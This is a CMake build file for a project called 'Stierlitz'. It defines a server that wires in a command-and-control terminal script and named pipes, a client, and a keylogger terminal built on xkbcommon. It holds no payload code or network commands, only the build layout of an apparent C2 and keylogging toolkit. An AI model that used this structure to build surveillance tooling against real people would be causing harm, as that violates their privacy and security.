cmake_minimum_required(VERSION 3.10)

project(Stierlitz)

set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED True)
set(CMAKE_BUILD_TYPE Debug) # DEBUG

# Directories
set(SERVER_INCLUDE_DIR ${CMAKE_SOURCE_DIR}/Server/include)
set(SERVER_SRC_DIR ${CMAKE_SOURCE_DIR}/Server/src)
set(CLIENT_INCLUDE_DIR ${CMAKE_SOURCE_DIR}/Client/include)
set(CLIENT_SRC_DIR ${CMAKE_SOURCE_DIR}/Client/src)
set(COMMON_INCLUDE_DIR ${CMAKE_SOURCE_DIR}/Common/include)
set(BIN_DIR ${CMAKE_SOURCE_DIR}/bin)

set(C2_SCRIPT_PATH ${CMAKE_SOURCE_DIR}/URXVT/c2_terminal.py)
set(C2_IN_FIFO_PATH ${CMAKE_SOURCE_DIR}/URXVT/fifo/c2_in_fifo)
set(C2_OUT_FIFO_PATH ${CMAKE_SOURCE_DIR}/URXVT/fifo/c2_out_fifo)
set(KEYLOGGER_SCRIPT_PATH ${CMAKE_SOURCE_DIR}/URXVT/keylogger_terminal)
set(KEYLOGGER_FIFO_PATH ${CMAKE_SOURCE_DIR}/URXVT/fifo/keylogger_fifo)

# Output directory for binaries
set(CMAKE_RUNTIME_OUTPUT_DIRECTORY ${BIN_DIR})

# Server target
file(GLOB_RECURSE SERVER_SRC_FILES ${SERVER_SRC_DIR}/*.cpp)
add_executable(server ${SERVER_SRC_FILES})
target_compile_definitions(server PRIVATE SERVER
    C2_SCRIPT_PATH="${C2_SCRIPT_PATH}"
    KEYLOGGER_SCRIPT_PATH="${KEYLOGGER_SCRIPT_PATH}"
    C2_IN_FIFO_PATH="${C2_IN_FIFO_PATH}"
    C2_OUT_FIFO_PATH="${C2_OUT_FIFO_PATH}"
    KEYLOGGER_FIFO_PATH="${KEYLOGGER_FIFO_PATH}"
)
target_include_directories(server PRIVATE ${SERVER_INCLUDE_DIR} ${COMMON_INCLUDE_DIR})

# Client target
file(GLOB_RECURSE CLIENT_SRC_FILES ${CLIENT_SRC_DIR}/*.cpp)
add_executable(client ${CLIENT_SRC_FILES})
target_include_directories(client PRIVATE ${CLIENT_INCLUDE_DIR} ${COMMON_INCLUDE_DIR})
find_package(Threads REQUIRED)
target_link_libraries(client PRIVATE Threads::Threads)

# Keylogger Terminal target
file(GLOB_RECURSE KEYLOGGER_SRC_FILE ${CMAKE_SOURCE_DIR}/URXVT/keylogger_terminal.cpp)
add_executable(keylogger_terminal ${KEYLOGGER_SRC_FILE})
find_package(PkgConfig REQUIRED)
pkg_check_modules(XKBCOMMON REQUIRED xkbcommon)
target_link_libraries(keylogger_terminal PRIVATE ${XKBCOMMON_LIBRARIES})
target_include_directories(keylogger_terminal PRIVATE ${XKBCOMMON_INCLUDE_DIRS})

set_target_properties(keylogger_terminal PROPERTIES RUNTIME_OUTPUT_DIRECTORY ${CMAKE_SOURCE_DIR}/URXVT)